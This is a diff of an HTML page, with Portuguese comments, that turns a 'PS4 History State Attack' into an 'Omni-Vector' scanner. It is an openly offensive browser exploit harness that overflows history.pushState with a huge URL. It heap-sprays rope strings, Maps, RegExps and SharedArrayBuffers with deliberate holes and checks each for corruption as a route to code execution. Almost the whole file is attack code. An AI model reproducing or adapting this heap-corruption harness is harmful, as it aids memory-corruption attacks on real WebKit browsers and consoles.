@@ -1,75 +1,198 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 History State Attack</title>
+    <title>PS4 Omni-Vector Vulnerability Scanner</title>
     <style>
-        body { background-color: #000; color: #ffaa00; font-family: monospace; padding: 20px; }
-        button { font-size: 20px; padding: 15px; width: 100%; border: 2px solid #ffaa00; background: #222; color: #fff; cursor: pointer; }
-        #log { border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; color: cyan; }
+        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .status-box { border: 1px solid #333; padding: 15px; background: #111; height: 150px; overflow-y: auto; }
+        button { 
+            grid-column: span 2; padding: 20px; font-size: 24px; 
+            background: #222; color: #fff; border: 2px solid #00ff00; cursor: pointer; font-weight: bold;
+        }
+        .active { border-color: yellow; color: yellow; }
+        .success { background-color: #004400; color: #fff; }
+        h3 { margin-top: 0; border-bottom: 1px solid #444; }
     </style>
 </head>
 <body>
 
-    <h1>Estratégia: State Object Corruption</h1>
-    <p>Tentando corromper o objeto 'state' vizinho.</p>
+    <h1>PS4 Omni-Vector Scanner</h1>
+    <p>Testando vetores exóticos para furar o Heap Isolation.</p>
 
-    <button onclick="startStateAttack()">INICIAR ATAQUE STATE</button>
-    <div id="log">Pronto.</div>
+    <div class="dashboard">
+        <button onclick="startOmniScan()">INICIAR VARREDURA TOTAL</button>
+        
+        <div id="log" class="status-box" style="grid-column: span 2; height: 200px;">
+            Log do Sistema...
+        </div>
+    </div>
 
     <script>
         const BASE_OFFSET = 709522;
-        const OVERFLOW_AMT = 1024 * 64; 
+        const OVERFLOW_AMT = 1024 * 128; // 128KB de agressividade
 
-        function log(msg) {
+        // Variáveis globais para segurar referência na memória
+        var vectorStore = [];
+
+        function log(msg, type) {
             const el = document.getElementById('log');
-            el.innerHTML += `<div>${msg}</div>`;
+            let color = type === 'win' ? '#0f0' : (type === 'err' ? 'red' : '#aaa');
+            el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        function startStateAttack() {
-            log("1. Preparando objeto de Estado Gigante...");
+        async function startOmniScan() {
+            log("Iniciando Protocolo Omni...", 'info');
 
-            // Cria um objeto grande para tentar forçar alocação no Heap Grande
-            // Usamos uma string repetitiva dentro do objeto
-            let targetData = "B".repeat(1024 * 512); // 512KB
-            let stateObj = { 
-                id: "TARGET_VICTIM", 
-                payload: targetData 
-            };
+            // 1. TESTE ROPE STRINGS
+            await runTest("ROPE STRINGS", setupRopes, checkRopes);
+            
+            // 2. TESTE MAP/SET
+            await runTest("MAP OBJECTS", setupMaps, checkMaps);
 
-            log("2. Injetando Estado + Overflow na URL...");
+            // 3. TESTE REGEXP
+            await runTest("REGEXP JIT", setupRegExp, checkRegExp);
 
-            setTimeout(() => {
-                try {
-                    // Payload da URL
-                    let buffer = "A".repeat(BASE_OFFSET) + "\x01".repeat(OVERFLOW_AMT);
+            // 4. TESTE SHARED BUFFER
+            await runTest("SHARED BUFFER", setupShared, checkShared);
 
-                    // A MÁGICA: Passamos o objeto E a URL corrupta juntos
-                    // Esperamos que o sistema grave o objeto, e depois a URL transborde em cima dele
-                    history.pushState(stateObj, "state_pwn", "/" + buffer);
+            log("Varredura Finalizada.", 'info');
+        }
 
-                    log("3. Verificando history.state...");
-                    
-                    // Lê de volta
-                    let currentState = history.state;
-                    
-                    if (!currentState) {
-                        log("Erro: Estado perdido (Crash evitado?)");
-                        return;
-                    }
+        async function runTest(name, setupFunc, checkFunc) {
+            log(`--- INICIANDO ALVO: ${name} ---`, 'active');
+            
+            // Limpeza prévia
+            vectorStore = [];
+            await forceGC();
 
-                    // Verifica se a string dentro do objeto foi alterada
-                    // Se o primeiro caractere virou 0x01
-                    if (currentState.payload.charCodeAt(0) === 1) {
-                         log("<h2 style='color:#0f0'>!!! SUCESSO !!! STATE CORROMPIDO</h2>");
-                         alert("RCE PRIMITIVE FOUND!");
-                    } else {
-                        log("Estado intacto. O overflow não atingiu o objeto local.");
-                    }
+            try {
+                // Configuração (Spray)
+                log(`Alocando memória para ${name}...`);
+                await setupFunc();
 
-                } catch (e) {
-                    log("Erro: " + e.message);
+                // Disparo
+                log("Disparando Overflow...");
+                let buffer = "A".repeat(BASE_OFFSET) + "\x01".repeat(OVERFLOW_AMT);
+                history.pushState({}, "scan_" + name, "/" + buffer);
+
+                // Verificação
+                log("Verificando integridade...");
+                let success = checkFunc();
+
+                if (success) {
+                    log(`!!! VULNERABILIDADE CONFIRMADA EM ${name} !!!`, 'win');
+                    alert(`SUCESSO: ${name} CORROMPIDO!`);
+                    throw "STOP"; // Para o teste para análise
+                } else {
+                    log(`Falha em ${name}. Alvo intacto.`, 'err');
                 }
-            }, 500);
+
+            } catch (e) {
+                if (e === "STOP") throw e;
+                log(`Erro durante teste ${name}: ${e.message}`, 'err');
+            }
+
+            // Limpeza pós-teste
+            vectorStore = [];
+            await forceGC();
+        }
+
+        // --- VETOR 1: ROPE STRINGS ---
+        // Cria strings concatenadas que dependem de ponteiros internos
+        async function setupRopes() {
+            const CHUNK = "R".repeat(1024 * 512); // 512KB base
+            for (let i = 0; i < 500; i++) {
+                // O WebKit cria um nó "Rope" apontando para CHUNK e o Sufixo
+                // Se corrompermos o nó, o length muda ou trava ao ler.
+                let rope = CHUNK + i.toString(); 
+                vectorStore.push(rope);
+            }
+            // Feng Shui (Buracos)
+            for(let i=0; i<500; i+=2) vectorStore[i] = null;
+        }
+        function checkRopes() {
+            for (let i = 1; i < vectorStore.length; i+=2) {
+                let r = vectorStore[i];
+                if (r && r.length < (1024 * 512)) return true; // Length corrompido
+                // Tenta forçar a leitura (flattening)
+                try { if(r.charAt(0) === 'X') return true; } catch(e) { return true; } // Crash/Erro na leitura
+            }
+            return false;
+        }
+
+        // --- VETOR 2: MAP OBJECTS ---
+        // Estruturas de Hash complexas
+        async function setupMaps() {
+            for (let i = 0; i < 2000; i++) {
+                let m = new Map();
+                // Enche o map para ele alocar backing store
+                for(let k=0; k<100; k++) m.set("key"+k, "val"+k);
+                m.padding = "M".repeat(1024 * 10); // Padding string anexada
+                vectorStore.push(m);
+            }
+            for(let i=0; i<2000; i+=2) vectorStore[i] = null;
+        }
+        function checkMaps() {
+            for (let i = 1; i < vectorStore.length; i+=2) {
+                let m = vectorStore[i];
+                // Se o ponteiro interno do Map quebrar, .size pode mudar ou .get() travar
+                if (m && m.size !== 100) return true;
+                try { m.has("key1"); } catch(e) { return true; }
+            }
+            return false;
+        }
+
+        // --- VETOR 3: REGEXP ---
+        // JIT Bytecode
+        async function setupRegExp() {
+            let pattern = "A".repeat(1000) + "B"; // Padrão longo
+            for (let i = 0; i < 1000; i++) {
+                let re = new RegExp(pattern + i, "g");
+                re.lastIndex = 0;
+                vectorStore.push(re);
+            }
+            for(let i=0; i<1000; i+=2) vectorStore[i] = null;
+        }
+        function checkRegExp() {
+            for (let i = 1; i < vectorStore.length; i+=2) {
+                let re = vectorStore[i];
+                if(!re) continue;
+                try {
+                    // Executar uma RegEx corrompida geralmente quebra o JIT
+                    re.exec("TEST STRING");
+                } catch(e) {
+                    return true; // Erro de execução = Código corrompido
+                }
+            }
+            return false;
+        }
+
+        // --- VETOR 4: SHARED BUFFER ---
+        // Memória compartilhada (geralmente fora do IsoHeap)
+        async function setupShared() {
+            if (!window.SharedArrayBuffer) return; // PS4 pode não suportar
+            for (let i = 0; i < 200; i++) {
+                let sab = new SharedArrayBuffer(1024 * 1024); // 1MB Shared
+                let view = new Uint8Array(sab);
+                view[0] = 0xAA;
+                vectorStore.push(view);
+            }
+            for(let i=0; i<200; i+=2) vectorStore[i] = null;
+        }
+        function checkShared() {
+            for (let i = 1; i < vectorStore.length; i+=2) {
+                let v = vectorStore[i];
+                if (v && v.length !== (1024*1024)) return true;
+                if (v && v[0] !== 0xAA) return true;
+            }
+            return false;
+        }
+
+        async function forceGC() {
+            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
+            return new Promise(r => setTimeout(r, 500));
         }
     </script>
 </body>
